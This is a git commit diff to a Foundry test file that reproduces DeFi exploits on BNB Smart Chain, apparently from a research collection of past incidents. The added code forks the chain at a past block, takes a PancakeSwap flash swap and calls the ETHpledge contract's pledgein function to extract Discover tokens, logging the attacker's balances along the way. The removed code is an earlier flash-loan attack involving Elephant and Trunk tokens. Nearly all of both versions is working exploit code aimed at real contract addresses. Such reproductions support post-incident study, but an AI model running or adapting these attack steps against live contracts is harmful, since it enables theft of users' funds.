d85dcfb34de5bb2714e65d7c95eb4fee68f29646
SunWeb3Sec <107249780+SunWeb3Sec@users.noreply.github.com>
2022-07-15 15:36:25 +0800

    Fixed

--- src/test/Discover_exp.sol
+++ src/test/Discover_exp.sol
@@ -4,65 +4,38 @@ pragma solidity 0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
+interface ETHpledge {
+  function pledgein(address fatheraddr, uint256 amountt)
+    external
+    returns (bool);
+}
+// Expected error. [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT] 
+// Because we don't repay funds to pancake.
 
 contract ContractTest is DSTest {
-  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-
-  address public BUSD_USDT_Pair = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;
-
-  address public elephant_wbnb_Pair =
-    0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;
-
-  address public BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
-
-  address[] path_1 = [
-    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,
-    0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688
-  ];
-
-  address[] path_2 = [
-    0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688,
-    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
-  ];
-
-  address[] path_3 = [
-    0xdd325C38b12903B727D16961e61333f4871A70E0,
-    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
-  ];
-
-  address[] path_4 = [
-    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,
-    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
-  ];
-
-  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
-
-  IERC20 elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);
-
-  IERC20 Trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);
-
-  IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-
-  InotVerified not_verified =
-    InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);
+  IPancakePair PancakePair =
+    IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
+  IPancakePair PancakePair2 =
+    IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);
+  IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
+  IERC20 discover = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);
+  ETHpledge ethpledge = ETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
   CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
   constructor() {
-    cheats.createSelectFork("bsc", 16886438); // fork bsc block number 16886438
+    cheats.createSelectFork("bsc", 18446845); // fork bsc at block 18446845
 
-    elephant.approve(address(router), type(uint256).max);
-
-    Trunk.approve(address(router), type(uint256).max);
-
-    Trunk.approve(address(not_verified), type(uint256).max);
-
-    busd.approve(address(not_verified), type(uint256).max);
-
-    wbnb.approve(address(router), type(uint256).max);
+    busd.approve(address(ethpledge), type(uint256).max);
+    discover.approve(address(ethpledge), type(uint256).max);
   }
 
   function testExploit() public {
-    IPancakePair(BUSDT_WBNB_Pair).swap(0, 100000 ether, address(this), "0x00");
+    bytes memory data = abi.encode(address(this), 19810777285664651588959);
+    emit log_named_uint(
+      "Before flashswap, BUSD balance of attacker:",
+      busd.balanceOf(address(this))
+    );
+    PancakePair2.swap(19810777285664651588959, 0, address(this), data);
   }
 
   function pancakeCall(
@@ -70,100 +43,18 @@ contract ContractTest is DSTest {
     uint256 amount0,
     uint256 amount1,
     bytes calldata data
-  ) external {
-    sender;
-    data;
-    amount0;
-    amount1;
-
-    if (msg.sender == BUSDT_WBNB_Pair) {
-      IPancakePair(BUSD_USDT_Pair).swap(
-        0,
-        90000000 ether,
-        address(this),
-        "0x00"
-      );
-    } else {
-      attack();
-    }
-  }
-
-  function attack() public {
-    wbnb.withdraw(100000 ether);
-
-    router.swapExactETHForTokensSupportingFeeOnTransferTokens{
-      value: 100000 ether
-    }(0, path_1, address(this), block.timestamp);
-
-    uint256 balance_elephant = elephant.balanceOf(address(this));
-
-    emit log_named_uint("The elephant after swapping", balance_elephant / 1e9);
-
-    not_verified.mint(90000000 ether);
-
-    uint256 balance_Trunk = Trunk.balanceOf(address(this));
-
-    emit log_named_uint("The Trunk after minting", balance_Trunk / 1e18);
-
-    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-      balance_elephant,
-      0,
-      path_2,
-      address(this),
-      block.timestamp
-    );
-
+  ) public {
     emit log_named_uint(
-      "The WBNB Balance after swaping",
-      wbnb.balanceOf(address(this)) / 1e18
+      "After flashswap, BUSD balance of attacker:",
+      busd.balanceOf(address(this))
     );
-
-    balance_Trunk = Trunk.balanceOf(address(this));
-
-    not_verified.redeem(balance_Trunk);
-
+    ethpledge.pledgein(
+      0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930,
+      2000000000000000000000
+    );
     emit log_named_uint(
-      "The BUSD after redeeming",
-      busd.balanceOf(address(this)) / 1e18
-    );
-
-    uint256 b3 = elephant.balanceOf(address(this));
-
-    emit log_named_uint("The elephant after redeeming", b3 / 1e9);
-
-    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-      b3,
-      0,
-      path_2,
-      address(this),
-      block.timestamp
-    );
-
-    emit log_named_uint(
-      "The WBNB Balance before paying back",
-      wbnb.balanceOf(address(this)) / 1e18
-    );
-
-    wbnb.transfer(BUSDT_WBNB_Pair, 100300 ether);
-
-    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-      wbnb.balanceOf(address(this)),
-      0,
-      path_4,
-      address(this),
-      block.timestamp
-    );
-
-    emit log_named_uint(
-      "The BUSD before paying back",
-      busd.balanceOf(address(this)) / 1e18
-    );
-
-    busd.transfer(BUSD_USDT_Pair, 90300000 ether);
-
-    emit log_named_uint(
-      "The BUSD after paying back",
-      busd.balanceOf(address(this)) / 1e18
+      "After Exploit, discover balance of attacker:",
+      discover.balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930)
     );
   }
 
